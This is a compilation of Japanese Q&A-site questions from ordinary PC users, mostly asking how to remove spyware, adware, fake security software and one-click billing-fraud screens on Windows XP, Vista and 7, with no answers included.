スパイウェアとウイルスについてお尋ねしたいのですが、 これらはPCの状態をスリープ状態にしてある時でも 動いているのでしょうか？それとも全く動作していないのでしょうか？ 宜しくお願い致します。
Macでドロップボックスを使用しています。今日、不審なファイルがドロップボックス内にどこからかアップロードされ、38秒間だけとどまった後、削除されました。ファイルの名前は25475100でテキストエディットでは開けず、CotEditorで開いてみた所、文字化けして読めませんでした。以前にも同じ経験をしましたが、前回は共有していたフォルダがあり、誰かが何か間違えてアップしたんだろう程度にしか思っていませんでした。既に共有フォルダは無くなっており、他に手がかりはありません。こんなことってありますか？ちなみに、このファイルはDropboxのブラウザ版で過去のイベント内からダウンロードする事が出来ましたので、SOPHOSでスキャンしてみた所異常なしと出ました。
Internet Explorerの （インタネットのプロパティー　セキュリティ）　信頼済みサイトのWebサイト内 下記？？のアドレス http://??download.windwsupdate.com http://??update.micosoft.com が削除できない。 　　？？のないアドレス http://download.windwsupdate.com http://update.micosoft.com は削除できる。 削除の方法をおしえてください。 この「削除出来ないサイト」は悪意のあるサイトかどうか教えてください。
以前から気になることが在りまして、webpageを繰っておりますといつの間にやら中国の字体で示されたpageを同じ日本語表示のpageとともにbrowserが開いています。 　spybotで調べてみたりしたのですが、一向に何も判りません。 　一体、何なんでしょうか？
マカフィーを使ってどのような検索が行われたのか、またどのようなサイトを訪問したのかはわかるのでしょうか？
今日ＰＣをさわろうとしたら、（電源はいつもいれっぱなしです） ほかの人がこのパソコンにログオンしています。保存されたデータは失われます、シャットダウンを続行しますか？ と表示されました。（本体の電源ボタンに何気にさわったみたいですが・・・） だれか第三者が留守中にさわったんでしょうか？それか母が？あるいは第三者がネットを通じて？（スパイウェア？） 心配です、どうしたらいいでしょうか？
Windows XP SP3でAvira, Comodo Firewall, Gred AntiVirusを入れ、それと随時Adawareでスパイウェア検査をやっております。Gred AntiVirusアクセラレータはInstall後は２、３ヶ月は元気やっているようすでした。PCが立ち上がるといま１50万人がクラウドを使ってます、みたいな表示がかならずでました。ですが、ここ数日はタスクバーにでてきません。起動して「今すぐスキャン」をさせてみようとすると「プログラムが実行されていません。サービスを再起動させてリトライして下さい。」とでます。現に起動してやったのになんで「実行されていない」のでしょう？また、再起動しても効果がないので、1回削除して再installしてみたら、その晩だけはタスクバーにも現れ、スキャンもできました。しかし翌朝は前と同じになりました。対策はあるのでしょうか。
芸能ニュースを読んでいたら、動画サイトに転送され、クリックしたら、料金請求画面が表示されるようになってしまいました。 請求期限がカウントダウンされ、入金しないと画面を削除できないと表示されます。 サンプル動画が流されただけで、加入の意思はないのに、強制的に加入させられたようです。 システム復元する方法を教えてください。
偶然ではなく、実際に「閲覧履歴」やＰＣの起動したこと、掲示板やソフトにアクセスしただけでも知られています。 （とくに会員としてのログインではなく） 最初に知られているのはＩＰアドレスと住所です。 相手はＬＡＮシステムにも詳しいので無線でＰＣ起動から監視でもしているのか、 また探偵の知り合いもいるようなのでどの方法で入手しているのか分かりませんが、 ウイルスソフトはＫｉｎｇｓｏｆｔを使用していて、とくにウイルス検出はありません。 このソフトでもハッキング等の足跡は残るのでしょうか？ ハッキングやサイバーストーキングは一体どのような方法で履歴を見ていると考えられますか？ なにか防ぐ方法はありますか？ 想像では、 ・ブラウザの閲覧情報だけ抽出している？ ・ＰＣ画面全体をモニタリングしている？ ・探偵から入手している？　のどれかかと思うのですが・・・ 詳しい方よろしくお願いします。 カテゴリ デジタルライフ ＞ スパイウェア対策
あるオークションサイトをプラウザ「ファイヤーフォクス」でログイン中、警告が表示されました。正確な文面を覚えていませんが、「悪意のある攻撃（インストール?設定変更?)を受けています。サーバークライアント?に助けを求めてください」といった内容のようでした。すぐさま接続を切りましたが、どのような攻撃がされていたのかまた、それは実行されてしまったのか?。可能性の話でかまいませんので、どなたか教えてくださいよろしくお願いします。 無料DNSサーバーを使用して接続しており、ブロードバンドルーターを使用していますが198.16***になっていませんでした。この場合、ルーターのセキュリティ機能は無効になっていたのでしょうか?(いわゆるネット直結状態?)。 念のため、信頼のおけるセキュリティソフトでフルスキャンをかけましたが、問題は見つかりませんでした。今後、このサイトは二度と利用しないようにしますが、それで大丈夫でしょうか?。よろしくお願いします。PS:IE8でも接続していましたが、そちらは警告等はでませんでした。
やたら来ます。 今までmacを使って来て、あまりセキュリティなど特別にしてこなかったのですが、 どのように対処するべきでしょうか。 スパムメールが来たのは、はじめてで 一回目に来たときに、中を開けてしまったかもしれないです。（記憶が曖昧） なにか問題が生じるのでしょうか。 なにか対処しておくべきことはありますか。
コントロールパネルからシステム診断してみたのですが、スパイウェア対策とウィルス対策が無効と診断されました。 自分としてはＰｃＴｏｏｌｓＦｉｒｅｗａｌｌＰulstとMicrosoftSecurityEssentialsをインストールしていて、右下のアイコンからではどちらも有効とのことで大丈夫だと思っていたのですが。 そこでWindowsDefenderも確認したのですが無効になっていて、有効にしようともエラーですることができません。 そもそも自分はMicrosoftSecurityEssentialsとWindowsDefenderの違いも良く解らないレベルです。 現在状況のセキュリティ対策としてどのような対処をすればよいのでしょうか。 ＰＣ関連に詳しくないので恥ずかしながらこの場を借りて質問させてもらいました。 宜しくお願いします。
Windows XP 先日ネットが急に繋がらなくなり、調べてもらったところウィルス感染しているとのことでした。 現在海外におり、PCを見てくれる人が現地の人のため日本語がわからず、完全に除去できず 一度使えるようになったのですが、次は電源を入れてもWindowsが開く前の黒い画面のままで 止まってしまい、F8を押しても変化なしでした。 その人にまた見てもらい、アンチウィルスソフトを自分が入れていたものよりお勧めのものに 変えてもらいましたが（AVG)、またWindowｓが開かなくなり・・・との繰り返しです。 実際使えている間も（一日ももちません）、インターネットのサイトを見ていると勝手に違うサイトが 開いたりします。 息子がフリーのゲームなどをしていたので、それが原因かと思い、それ以降は使っていませんが まだ数ヶ月海外にいる予定で、自分にとってPCはとても重要なものでなんとか解決したいです。 PC初心者で質問するにあたり、何が必要なことかすらよくわかりませんが、アドバイスがあれば 教えていただきたいです。 よろしくお願いします。
マイコンピュータの（C）にありました。 検索しても英語のサイトばかりで分かりませんでした。
先日、知らないサイトからファイルをダウンロードしてしまい、windows total protectionといった名前のスパイウェアに感染してしましました。 調べたところ偽セキュリティーソフト？だそうで、パソコンに詳しい人知り合いもおらず、面倒なのでリカバリしてしまいました。 その際に、音楽と写真のバックアップだけはしました。 知らないサイトからダウンロードしたファイルはバックアップしませんでした。 そして先ほど、今度はmalware protectionというこちらも偽セキュリティーソフトらしきものに感染してしまいました。 これはwindows total protectionよりもひどく、exe がつくともう何のプログラムも立ち上げさせてくれない状況です。(初心者なのでexeの意味すらわからないのですが。) 一応調べて対策のソフトを試そうとしたのですが、パソコンに関してあまり知識がないので、別のパソコンでダウンロードしてＵＳＢでうつし問題のあるパソコンでやるくらいのことしか思いつかず、それもmalware protectionのポップアップによって阻止されてしまいます。 これは、adobe readerのポップアップにアップデートしろといったことが書かれていたものをクリックした瞬間になりました。そしてその前もいろいろitunesなどダウンロードしていました。 そしてその際には、macafee total protectionに入っていたのにもかかわらず、感染してしまったみたいです。 リカバリしてももうだめなのでしょうか。それとも音楽と写真のバックアップをあきらめるべきですかね？ 自分が悪くてこうなってしまったのはわかっているのですが、それでも詳しい方、どうか助けてくれるとありがたいです。 文章もめちゃくちゃで申し訳ありません・・・
アダルトサイトを見たわけでもないのに、「入会手続きが完了しました。入金して。。。」みたいな画面が、しょっちゅう現れるようになりました。 どのようにすれば現れなくなりますか。 教えてください。
　２ちゃんねるオークション板の書き込みにヤフオクのURLが貼ってあることがあります。 　たいていはその出品のページへ飛びますが、中には下のURLのように必ずログインのページへ飛ばされる場合もあるのですが、これはフィッシングのような物が仕込まれているのでしょうか? http://hibari.2ch.net/test/read.cgi/yahoo/130298 …
Windows7を使っています。 1週間ぐらい前に、タスクマネージャーを確認してみると、アプリケーションに「Chris」というのがあります。特に、そういったアプリケーションをインストールした記憶がなく、いろいろPC内を検索をしてもそういったアプリケーションはありません。 タスクマネージャーでプロセスを確認すると「svchost.exe」になります。 ネットで「Chris」のアプリケーションについて検索をしても特に何もヒットするものもなく、プロセスの「svchost.exe」については、「svchost.exe」がたくさんある場合はウィルスに感染している可能性があるとありました。 どんなアプリケーションかもわからないため、「Chris」を削除をしたいのですが、何を削除していいのかもわからない状態です。 また、ウィルスソフトには、ノートンインターネットセキュリティ2010をインストールして、ウィルスチェックをしても特に問題はありません。 「Chris」がなんなのか、ウィルスに感染しているのか？何を削除すればいいのか？教ええていただけませんか？ よろしくお願いします。
P2P地震情報をスタートアップにいれてあるんですが、パソコンが起動した際に外付けHDDがUSBで接続されていないと、必ずエラーになって起動ができないんです。 HDDのUSBを接続すると起動します。 P2PのフォルダなどはすべてCドライブの中に入っているのに、なぜ外付けHDDがパソコンに接続していないと起動しないんでしょうか？勝手にHDDにアクセスをしようとしているんですか？
発行元MediaGet LLCのMediaGet2のプログラムをWindows Media Playerと勘違いしてインストールしてしまったので削除を試みるもすべてのプログラムからは削除できても、プログラムの追加と削除では削除されません。 因みにこのプログラムはロシア語の表示でウイルスチェックでは問題ないようですが、やはりパソコン内に残っていると気持ちが悪いので削除方法についてご教示下さい。
セキュリティーレポートにスパイウェアの処理数のところに、「webサイト56」と表示されます。 これは危険な状態でしょうか！！？？？
先日、アニメ動画をダウンロード作業した後から、おかしくなったんですが、なんの操作もしてないのにも関わらず、タスクマネージャが出て来て、何度消しても又、しつこく画面に現れます。ウィルススキャンをかけるとＴrackingCookeyの文字が並びます。何かしらの因果関係が有るのでしょうか？
曲を探していて「JetStrem城達也(9)」を再生したら、サムネールのすぐ上に（！続行する前に：無料スキャンを実行してWindowsのエラーを探す　RegistryBoosteｒ2010を使用してWindowsレジストリーを無料スキャン）と出る。もちろんこんなものをクリックする気などありません。スパイウェアのカテゴリーで検索 したら、多数のトラブル報告らしき事例がありました。過去の回答の中には「あんたが自分で入れたんでしょうが」的表現が目立ちました。しかしサムネールを次々クリックしている時などに、不慣れな人をうっかりミスで誘い込むようなやり方は、やはり相当に悪質ではないでしょうか。少し前に、PCToolsの RegistryMechanicというのに入られ、悩まされたのも、おそらくこの手のものでは、と思いました。ユーザー特に初心者には、快適なデジタルライフを損なう、全く迷惑この上ない存在です。どこの会社なのか知りませんが、放って置くしかないものなのですか。
レジストリエディタにsearch assistantというフォルダがあります。 以前これを削除しましたら、（他のフォルダかファイルも削除したかもしれません） インターネットにつながらなくなりました。 しかし、数日後なぜか元に戻り、ネットにつながり、このフォルダもまだあります。 このフォルダの中にcashfiesta shopathomeというかなり前に駆除したはずのスパイウェアのデータがあります。 このフォルダは削除しないほうがよろしいのでしょうか？ そしてフォルダの中にあるこれらのファイルはどのように対処したらよろしいのでしょうか？ 駆除できるソフト等ありますでしょうか？ ちなみにスパイボットやシマンテック、トレンドマイクロのスキャンでは search assistantは検出されませんでした。 専門的なことはよくわかりません。 ご存知の方いらっしゃいましたらご指導よろしくお願いいたします。
先日より、アバストアンチウィルスソフトから、 「悪意のある URL をブロックしました」というアラートが頻繁に表示されるようになりました。 このウィルスの駆除方法を教えてください。 ■アラート内容 悪意のある URL をブロックしました アバスト!ネットワーク シールドが害のあるサイトをブロックしました。 オブジェクト： moox.cz.cc/mainnnn/gate.php?guid=・・・・・・・・・・・・ 感染： URL:Mal 処理： ブロックしました プロセス： C:\Windows\Explorer.EXE 以上
お世話になります。 知人のパソコンの１台におかしな症状が出ています。 IEを起動すると「xp total security 2011」というソフトが起動し、「セキュリティソフトが不十分なのでブラウジングするのは危険だ」といった内容のメッセージが英語で表示され、ブラウジングできなくなります。そして「xp total security 2011」のフルバージョンを購入するよう画面上で促され、購入ボタンをクリックするとクレジットカードの決済ページが表示されます。 すべて英語で表示され、強制的にブラウジングをできなくするなど、おかしな感じがするのですが、 これは、ウイルスなのでしょうか？この症状を改善する方法はあるでしょうか？ なぜこのような事になってしまったのか、原因として考えられる事はあるでしょうか？ 自分が管理してるパソコンではないので、よく分かりません。 分かる方がいらっしゃいましたら、ぜひアドバイスをお願い致します。
シマンテックでオンラインスキャンしましたところ、 C:\temp\Remover.exe は　Adware.MediaPass に感染しています。 という結果がでました。 http://oshiete.goo.ne.jp/qa/2088310.html こちらの回答を 参考にさせていただきましたが、 該当するようなファイルはみあたりませんでした。 対処法をご存知の方がいらっしゃいましたら ご指導よろしくお願いします。 OSはWINDOWS XP home です。
zonealarm security alert　の表示が常にＰＣ画面右下にでています アメリカのものなのか英語表示で対処の仕方がいまいちよくわかりません また以前　「あなたのＰＣは複数のセキュリティー会社を使っており非常に危険です」 というような表示が出たこともありました 実際　webrootスパイスウィーターというものもメニューに表示されています なのでこの　zonealarm　を削除する方法をわかる方教えてください
IEを閉じた時やシャットダウンする時にタスクバーの ワイヤレスネットワーク接続アイコンが光ります。 これってPCの情報が送信されてるんでしょうか？ XPのPCでワイヤレスでネットをしています。 セキュリティはMSEと標準のファイアウォールだけです。 いつ頃からかは覚えてませんが海外からの当選金の知らせといったような あやしい郵便物が届くようになりましたがこれと関係あるんでしょうか？
コンピューター監視法案が出来たそうですが自宅PCからの書き込みにより個人を特定できる物ですか？ 菅さんや枝野さんや東電に批判的な事を描いたら個人に名誉毀損がいくんですか？ 例えばヤフーIDを持ってて知恵袋に書き込んだ場合、登録クレジットカード情報から逆探知する事って可能なんですか？ バカな、と思うかもしれませんが 最近の政府はやる事が戦前の憲兵ぽくて恐ろしいんです 検閲みたいな事本気でやりかねない気がしてきて不安です 2chも原発推進に批判的なスレがスレストされて言論の自由が妨げられてますし 情報もマスゴミぐるみで隠してましたし。 「監視」って響きも恐ろしいですよね？
PC初心者です。Vistaを使用しています。 数日前からＰＣを立ち上げると勝手にインターネットのブラウザが起動します。 色々（Ad-Aware,Spypod,ＰＣ自体の復元←なぜか復元できない・・）調べてやりました。 状況は変わりません・・・ 何卒助言のほどよろしくお願いします。
こんにちは。 長文です。上手くまとめられなくてすみませんが、お付き合いください。 使っているPCはWindowsVista。ダウンロードしたのはフリーソフト、Woopie Video DeskTopです。 私は動画変換のソフト探しの過程でWoopieをダウンロードしたのですが、結局うまくいかずにアンインストールすることにしました。 コントロールパネル→プログラムのアンインストールで削除しました。 しかし、IEをたちあげるとYahooツールバーの中にWoopieが入っていて、立ち上げるたびにIEページ下に水色の広告が出ます。いちいち立ち上がるのが鬱陶しいうえにアンインストールしきれていなかったのが怖くて仕方ありません。 状況的には下記の方の質問と全く同じです。 http://oshiete.goo.ne.jp/qa/6483605.html 本当にこの方と状況的にはそっくりなので、参考にしてみたのですがいまいちどこの部分の話をしているのが理解できませんでした。パソコン自体をリセットしないといけないのかなど本当に解らないことだらけです。 尚ツールバー内の方はアンインストール後、またインストールしなおしたら消えていました。 問題はページ内に現れる水色の広告の方です。 消したいのでブロックするやり方ではなく削除する方法が知りたいです。 他にも色々な方の類似意見を参考に以下のことはやってみました。 ・タスクマネージャ‐から"LP.exe""optserve.exe"を削除する→その名前のファイルがなかったです。 ・プログラムのアンインストールで「ファイル名[オプトメディア]」の削除→上に同じ ・ツール→アドオン管理→Woopieと書かれたファイルの削除→やっぱりありませんでした。 他にも見ては見たのですが、レジストリ、システムファイル、アドオンなどわからない言葉が多くて。PC面では本当に無知なので、長くても良いので出来るだけ詳しく教えてください! 長々とスミマセン。 回答の方よろしくお願いします。
　SpyRescue(スパイレスキュー)のウェブスキャンで、アドウェアCoolWebSearchが発見されましたが、何度駆除してもすぐに復活してしまいます。疑わしいレジストリーコードです。セーフモードでもダメでした。レジストリーエディタでは削除不可です。アドミニスター(管理者権限)への切り替えかたがわからないので、これはためしていません。Ｏｗｎｅｒで作業しています。ユーザーの切り替えではＯｗｎｅｒしかなく、アドミニスターに切り替えれません。 　SpyRescue(スパイレスキュー)以外のベンターでは、疑わしい(不正コード)として発見されません。誤検出なのでしょうか? 　家のPC4台中ＸＰ2台では検出されずに、購入して2日目のカスタマイズセッティングしたての64bit7と以前から使用中のＶｉｓｔａからのアップグレード７の２台からのみ共通して検出されます。ＸＰの２台との相違点や７の共通店を模索していますが、何が原因かは判明していません。いったん書き換えられたコードは、削除できないようです。 　できればリカバリーは避けたいので、良い方法があれば教えてください。よろしくお願いいたします。 http://www.spywareguide.jp/product_show.php?id=599 http://www.spywareguide.jp/product_show.php?id=599 http://www.shareedge.com/modules/shareware/view_ … http://www.hareedge.com/modules/shareware/view_s … http://mikko.homeip.net/benri/hyoji2.cgi?tensou= …
Windows７でセキュリティーソフトは「Webrooot Antivirus Spy Sweeper」を使っています。 起動の度に「MｃAｆｅｅ　Security　Scan」のアップデートを促す画面が出てl来るのですが、インストールしても良いものでしょうか？ また、インストールする際の注意事項等ありましたら教えて下さい。
Spybot - Search & Destroyお新規にインストールしたのですが 最初のアップデーターU　でアップデーター検査かけアップデーター定義ファイルお インストールしょうと思ったのですが 写真のように　？マークが全部についていて　よく解りません アップデーターダウンロード好きなのして大丈夫なんでしょうか 危険は無いのでしょうか　教えてください。
ルータの配下に有ってもバックドアの危険性を回避し切れないのでしょうか。
管理者パスワードが制限付きアカウントでわかる方法ってありますか？ どんな方法でもいいのでお願いします！
管理者パスワードをわすれてしまって、今は制限付きのアカウントでやっているんですけど、制限付きのアカウントで管理者パスワードがわかる方法とかありますか？ たとえば管理者パスワードが※ででてくる方法とか、とにかく制限付きアカウントで管理者パスワードがわかる方法おしえてください！お願いします！
よくあることだと思いますか？
変なサイトにアクセスしてしまい、年齢を入れクリックしたら 「おめでとうございます。会員登録完了しました。365日以内に○○円支払ってください。」 など怖いことが沢山書いてありました(;_;) 私は、会員登録しようなんて全く思っていないのに、そういう画面になりました。 怖かったので、そのサイトはすぐに消しました。 又、「退会してもその金額は払って頂きます」など書いてあり…もうどうすればよいかわかりません。金額が高額でした。 払える値段でなかったです。 これからそのサイトからの請求が来たらどうすればよろしいのですか？(T＿T) 無視しても大丈夫なのでしょうか？？ 携帯代と一緒に勝手に その金額がおろされるとか あるのでしょうか… 今、すごく怖いです。 もうむやみやたらに 色々なサイトクリックしない と誓いました。 質問の仕方がまとまっていなくて、すみません。 助けて下さい。
電子メール　netsurfin　のみの安全に限って総合的にどれがお勧めかひとつに絞って教えてください？ (1) (1)軽いこと。ESETsmart　security (2)無料または安いということ。F-セキュア無料サービス版またはアバスト! インターネットセキュリティ (3)仮に有料なら支払方法が難しくないこと。コンビにでの支払いは操作がなれないと難しい。 　パッケージ版ならビックカメラかヨドバシのwebsiteでの価格 (4)アンインストールが簡単で並びにインターネットに接続しないうちにインストールが簡単にできること。McAfee (2) ESETsmart　security　F-セキュア　アバスト! インターネットセキュリティ　McAfee 以上のうちどれが経験的に電子メール　netsurfin　のみの安全に限って総合的にどれがお勧めかひとつに絞って 最新の情報を教えてください？WindoesXPsp2のミニノートのPCレベルの1台使用のみとします。 (3) 停電でブロードバンドプロバイダからの増幅器が作動しません。インターネットをNTTの 電話回線でするしか無いと思います。ラトックのFAXモデムUSB56K/14.4Kでnetsurfin できるでしょうか？よろしくアナログ電話回線での最新経験談をお願いいたします。 2011年3月22日
AVIの動画をmp4に変換したくて、FoxTabというソフトをDLしたのですが、 上手く起動しなかったので、このプログラムを消そうと思いました。 しかし、コントロールパネル→プログラムの追加と削除を行っても 削除できません(涙) 削除の仕方を教えてください。 また、消えてなくても問題はないのでしょうか？ いろいろ調べてみたのですが、これはマルウエアなのでしょうか？ OSはwindows　xpです。 何も疑わずにDLしてしまった自分が悪いと反省しています。 どうか、問題があるのか、ないのか教えてください。お願いします。
ページを開いていると、度々 「申し訳ありませんが、http://www.facebook.com/plugins/like.php%3Fhref は見つかりませんでした。関連するウェブ サイトは次のとおりです。」 とGateway検索ページが、出てしまいます。 スパイウェアが入り込んだのかな？ とZAQ(ケーブルテレビ会社とプロバイダー契約しているので）の セキュリティソフト・マイシールドで検索しても 何も出てきません。 表示されているURLへのアクセスを仕掛けているソフト(スパイウェア？）を 削除する方法は、ありますでしょうか？？ コメント欄への書き込みの際にも、ページが変わってしまい、 一度消えてしまうと　なかなか仕切り直しして書き込むのは、 大変です（－－； WindowsXP　IE８を使用しています。 パソコンは、Gatewayのノートパソコンです。 お手数をお掛けしますが、 宜しく　ご指導下さいm(__)m
現在使用している建設業アプリケイションをバージョンアップするとウィルスソフト１１では誤動作を起こすと報告がカスタマーセンターから届きました。しばらく、バージョンアップをしないで使っていましたが、法律の改正とともにどうしてもバージョンアップしなければならなくなりました。建設業アプリケーションの開発の方も、ウィルスバスター１０に下げてもらうしか仕方がないとのことでしたので、下げたいのですが、どのようにしたら宜しいでしょうか？
Thunderbird3.1.9において迷惑メール設定を行ったのですが、１割程度しか迷惑メールフォルダに振分されません。 強力な迷惑メール対策ができるとアナウンスされているのですが、１割程度の識別率ではほとんど使い物にならず、迷惑メールを分別する手間が掛かっています。。 どうゆう要因なのでしょうか。 なお、迷惑メールとしてマークしたメールは約1000通に達しています。
トロイの木馬感染 先ほどダウンロードしたzipファイル解凍したところ、３つほどウィルスが検知されたとの警告が出ました。（添付画像参照） その中には『トロイの木馬』という単語も含まれていたのですが、PC初心者のため焦ってしまい、すぐにそのダウンロードしたファイルを削除し、ゴミ箱を空にしてしまいました。 その後、色々調べてみたところ、まずLanを抜く。アンチウィルスソフトでスキャンをして対処する、 と書いてあったのでその通りにしたのですが、ウィルスは検知されませんでした。 しかし、その2時間後にアンチウィルスソフトが、前述したものと同じウィルスを検知したので、ウィルス隔離室に移し、ウィルスを隔離室から削除しました。 一応不安なので、現在Windows Live OneCare PC セーフティでPCをスキャン中です。 対処の仕方はこれで正しいのでしょうか・・・。 ちなみにOSはXP アンチウィルスソフトはAVG　Anti-Virus Free Editionです。 宜しければ、早急なご回答をお願いいたします。 カテゴリをどちらにしていいのか判断できなかったので、 「ウィルス対策」とこちらに書き込んでおります。ご了承ください。
タイトルのとおりです。 http://www.safer-networking.org/jp/index.html ここで私がインストールしたSpybotは、前のPCでも今使っているPCでも、免疫の部分だけ日本語じゃないのです。それが普通だと思っていたのですが、久しぶりに使い方のサイトを再び http://enchanting.cside.com/security/spybot2.html ここのサイトをみてみると、なんと免疫の部分まで日本語です。 みなさんが使っているSpybotは、免疫の部分まで日本語ですか？ Spybotの免疫の部分まで日本語化にするやり方を教えてください。OSは、Win7 Starterです。 よろしくお願いします。
過去の質問を参考に読みましたが、解決しないので教えてください。 昨年末に、Win7のノートパソコンに買い換えました。 インストールの覚えがないのに、Jwordが頻繁に画面の左に表示されます。 このJwordの画面の右上の工具のアイコンをクリックして開くのはJwordの ホームページと思うのですが？。 ここには”このパソコンにはJwordはインストールされていません”と表示されます。 この場合Jwordを表示させないようにできるのでしょうか。 良い方法があればご教示ください。
はじめまして。 昨日のニュースで、【モルガン・スタンレーがオーロラ攻撃の被害を受けた】とありますが、【オーロラ攻撃】の意味と由来（なぜ、オーロラなのか）を教えて下さい。 よろしくお願い致します。 参考ＵＲＬ　http://headlines.yahoo.co.jp/hl?a=20110304-00000 …
ウィルスのTrojanに攻撃されています。Applicationがスタートできません。インターネットを開くと、このページはあなたのPCに害を及ぼすと出てきて、必ずAntiMalware　Goのページにとばされてしまいます。ウィルス駆除・対策ソフトを買えということなのでしょうか？調べたいことがあって早急にインターネットを復活させたいのです。このような形でお金を払わせるためにウィルスを送るということも耳にします。買っても大丈夫なのでしょうか？
謎のアプリケーションが、インターネットを使用し海外サイトにアクセスしたら勝手にインストールされてしまいました そのアプリケーションは勝手に常駐してハードディスクのスキャンを始めたり、タスクマネージャーの起動を妨害したり、ZIPファイルの解凍を妨害したり様々な悪影響をPCに及ぼしてきます 消去しようにもコントロールパネルのアプリケーション一覧にも表示されず、Cドライブの中身を覗いてみても同じ名前のファイルは見当たりません 一体どうしたら良いのでしょうか?
百度という中国の検索サイトを使っていますが、クラッキングされたりウイルスを入れたりしている可能性はありますか？ 主に動画や絵の検索をしています。 中国語の勉強等の為に中国の動画を検索するのに、都合が良いから使っているのですが 中国は、クラッキングが多いと聞くので不安になってしまいました。 自分が使ってるPCはいずれも、avast!とPCtoolsのファイアーウォールを導入しています。 心配しすぎでしょうか？ 前にパソコンの画面に勝手に「うぇえええ」と入力された事があります。←その後リカバリしました。これは、クラッキングやウイルスによるものでしょうか？ウイルスチェックでは、見つかりませんでしたが よろしくお願いします。
先ほどWindows Defenderで 「Adware:win32/open candy」 というアドウェアを検出し削除しました。 どういった種類のアドウェアなのかと検索をかけましたが 引っかからず、どのような被害があるかと心配しています。 Windows Defenderで、説明として 『このプログラムは、望ましくない可能性がある広告をコンピューターに配信します。』 とだけ書いてありますが、個人情報の流出などする可能性は ありますでしょうか？？
教えて下さい、初心者です。 ワンクリックしたとしても、こちらの、IDがどうして分かるのでしょうか、 消しても数秒後にしつこく表れる、メカニズムを教えてください。
無料でavastを利用しているのですが Win32:Malware-gen　というワームをチェスに移動も削除を選択しても 「アクセスが拒否されました」　となります どうしたらいいでしょうか？ 真剣に困っています　 アドバイスお願いいたします。
VISTAです。 いきなり、スタートアップもほかのアプリケーションも立ち上がらなくなりました。 でてくるのは、デスクトップに、危険なので、すぐこれこれを購入したほうがいい という内容のものです。 CHROMEなどをたちあげようとすると、Can't be executed. アンチウィルスをたちあげようとすると、Can't be executed. でその後はおきまりの、「購入したほうがいい」のポップアップです。 LAVAのAD_AWAREというものが怪しいかなとおもって SAFE MODE　でそれをはずそうとしたのですが、 Uninstallation completed とかでてるのに、再スタートするとまたそこにあります。 そして、同じ上記メッセージの繰り返しなのです。 解決策をどなたか教えてください。
ウイルスバスターについて教えて下さい。 私が現在使用しているウイルスバスターが２０１１年２月２８日に更新期限を迎えます。 最初はダウンロードで３年版を購入しようと思いましたが、調べてみると製品版を購入した方が安い事に気付きました。 検討しているのは ウイルスバスター２０１１クラウド・３年版（税込６７００円）と ウイルスバスター２０１０・３年版（税込５４００円） の２種類です。 何故『２０１０』を候補に挙げているのかというと ウイルスバスターは購入すると『無料でバージョンアップ』ができますが 価格の安い『２０１０』を購入して直ぐに『２０１１』にバージョンアップして３年間利用出来るかどうかを皆様に教えて頂きたいのです。 御存じの方がいらっしゃいましたら教えて下さい。 宜しくお願い致します。
起動時にRUNDLLLで以下のエラーがでつづけます。 C/Users/.../Appdata/Local/SLeauc.dll C/Users/../AppData/Local/agaxuxuvijuki.dlｌ 、、、could not found. ３週間前ラップトップ（東芝）購入時についてきたMCFEEの使用期間がきれそうなので、AD-AWAREとAVAST（両方フィリー版）　もいれましたが、そのためでしょうか？ どうも、フルスキャンのたびに、エラーメッセージが増えているようです。 このまま、増え続けるのでは？？と、心配です。 （いまだ、PCの操作には影響はでていません。突然落ちたりとかはしないのですが。、） ほかの方の質問では、HIJACKDIS　を使用してみるとよいようなのですが、このエラーにも 対応しますか？- PC初心者なので、よろしくお願いします。
数日前から急にWINDOWSの起動に不備がでました。 ただ電源を入れただけだと起動中に止まってしまうので （起動します・・・のまま進まない状態） 起動中にF8を押し、 「最近通常に起動できたときの状態で起動？」←正確ではありません で起動するととりあえず起動できますが、動作が遅いことがあります。 また、通常の始めの画面（いろいろなアイコンがのってくる画面）になったときに 下記のエラーがでます。 ↓ 「C\WINDOWS\system32\csnppro.dllを読み込み中にエラーが発生しました。 指定されたモジュールが見つかりません。」 ウイルスチェック、スパイウェアチェック済みです。 またこちらのサイトやインターネットで調べまして、レジストリにある似たようなものを削除してみましたが 改善されませんでした。 大事な情報が入っていたりするパソコンなので とても心配なのですが、どなたが何か少しでもお分かりになることがあれば ぜひお教え下さい。 どうぞよろしくお願い致します。
スパイボットで検査したら2.3個スパイウェア？というものが検知されて、削除したのですが、 こういうものが入っていた状態でamazon等のインターネットショッピングで買い物をしたら、個人情報盗まれてとても危険なのでしょうか？知らない第三者に高額商品を買わされたり・・・ クレジットカードは使用していませんがスパイウェアというようなものが検知されて、そのパソコンで前々からネットショッピングをしていたので不安です、これからどういう危険性があるのでしょうか？よろしくお願いします。
スパイウエアドクターフリー版　という スキャンだけ出来るソフトなのですが、 USAGC　というウェアを検出したのですが、 これはどんな悪ウェアで、どうすれば駆除できますか？ フリーなので駆除機能がありません。 またこのソフトは、検出ウェアの場所を示すエクスプローラーツリー情報が表示されませんので、 どこにこの悪ウェアがあるのかがわかりません。 ウインドウズの検索もしてみたのですが、掛かりません。 どこにあるか解る方法はありますか？ フリーなままでの駆除方法も教えてください。
閲覧ありがとうございます！ いつもはyahooなのですが あるソフトをインストールした際 askというソフトまでインストールしてしまったようでトップページがyahoo→askになってしまいました そこでyahooに変えようと ホームページボタン？の横にある設定みたいなものでaskを削除したところ 空白のページという物に なってしまいました (多分askを消してそのまま何の設定もせずだったからだと信じてます...) その際画面は真っ白で 上にはabout blankと 書いてありました 詳しく調べるとabout blankはスパイウェアの可能性でもあると知り心配で仕方がありません 違うと信じ私は過去のログを見てインターネットの設定を初期化しました 初期化すると空白のページも無くなり元通りになりました (yahooも使えています) これってabout blankは スパイウェアではなかったということで良いのでしょうか。 教えていただけると ありがたいです。
スリープとシャットダウンではどちらが安全でしょうか？
WXPproSP3 + eset SmartSecurity 4.2.71.2 User です． Shields Up! と Norton Security Scan on-line で Port Scan したところ Port 443 が Open になっていました．別の 3G 接続環境（docomo BF-01B) では全ポート stealth でしたので マンションが契約しているプロバイダのサポートに問い合わせましたところ， 「弊社がマンションに設置しているルーターを遠隔操作する為に，わざと 443 を Open にして あるので，問題ありません．」 と回答されました．がクレジットカード情報等が，外部にダダ漏れになっていないか心配です． 本当に問題ないんでしょうか？ それとも自己防衛にブロードバンドルーターを購入すべきで しょうか？
